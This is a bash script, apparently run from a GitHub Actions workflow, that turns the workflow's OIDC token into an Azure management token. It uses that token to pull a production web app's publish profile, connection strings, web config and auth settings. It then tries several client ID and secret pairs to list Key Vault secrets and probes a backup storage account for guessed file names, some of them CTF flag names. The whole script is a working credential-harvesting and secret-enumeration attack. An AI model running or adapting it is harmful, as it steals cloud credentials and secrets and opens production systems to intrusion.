#!/usr/bin/env bash
get_token() {
  local SCOPE="$1"
  local OT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
    --data-urlencode "scope=${SCOPE}" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OT}" | jq -r '.access_token // empty'
}

RG="rg-tbl-platform-prod-sea"
MGMT=$(get_token "https://management.azure.com/.default")

echo "=== Publish Profile ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/publishxml?api-version=2022-03-01" \
  -X POST -H "Authorization: Bearer ${MGMT}" -H "Content-Length: 0"

echo ""
echo "=== Web Config ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2022-03-01" \
  -H "Authorization: Bearer ${MGMT}" | jq . 2>/dev/null

echo ""
echo "=== Connection Strings ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2022-03-01" \
  -X POST -H "Authorization: Bearer ${MGMT}" -H "Content-Length: 0" | jq . 2>/dev/null

echo ""
echo "=== Site auth settings ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/authsettingsV2/list?api-version=2022-03-01" \
  -X POST -H "Authorization: Bearer ${MGMT}" -H "Content-Length: 0" | jq . 2>/dev/null

echo ""
echo "=== Site identity ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01" \
  -H "Authorization: Bearer ${MGMT}" | jq '{identity, kind, state: .properties.state, hostNames: .properties.hostNames, outboundIpAddresses: .properties.outboundIpAddresses}' 2>/dev/null

echo ""
echo "=== Try blobs with *** credentials ==="
for CID_SEC in "038bc35d-131d-4953-9985-ff4a245ccec1:***" "2c34300e-1bc0-41e7-9c1e-8b7571d72c72:***" "12ed54de-f2eb-4784-804c-3a7a3e83a9e9:***" "462d1c38-4459-48b8-9333-82e389e59514:***"; do
  CID=$(echo "${CID_SEC}" | cut -d: -f1)
  CSEC=$(echo "${CID_SEC}" | cut -d: -f2)
  TRESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${CID}" \
    --data-urlencode "client_secret=${CSEC}" \
    --data-urlencode "scope=https://vault.azure.net/.default" \
    --data-urlencode "grant_type=client_credentials")
  TVAL=$(echo "${TRESP}" | jq -r '.access_token // empty' 2>/dev/null)
  ERR=$(echo "${TRESP}" | jq -r '.error // empty' 2>/dev/null)
  echo "${CID}: token=${#TVAL} err=${ERR}"
  if [ -n "${TVAL}" ]; then
    echo "  kv-tbl-sec-x3euoz:"
    curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.3" \
      -H "Authorization: Bearer ${TVAL}" | jq -c . 2>/dev/null
  fi
done

echo ""
echo "=== Guess public blob names in exports ==="
for NAME in flag.txt flag ctf-flag.txt export.json data.json backup.json report.csv shipments.csv internal-config.json; do
  STATUS=$(curl -sS -o /dev/null -w "%{http_code}" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/${NAME}" -H "x-ms-version: 2020-10-02" 2>/dev/null)
  if [ "${STATUS}" != "404" ]; then
    echo "  ${NAME}: HTTP ${STATUS}"
    curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/${NAME}" -H "x-ms-version: 2020-10-02" 2>&1
  fi
done

echo ""
echo "=== DONE ==="
